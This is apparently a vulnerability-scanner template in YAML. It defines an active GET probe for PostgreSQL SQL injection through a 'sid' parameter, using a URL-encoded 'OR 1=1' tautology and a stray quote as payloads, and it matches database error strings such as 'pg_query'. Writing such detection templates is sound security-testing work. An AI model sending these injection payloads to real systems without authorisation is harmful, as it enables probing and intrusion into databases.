id: sqli6-pg-25
name: 'SQLi pg probe in sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - '''%09OR%091=1--'
        - '"'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
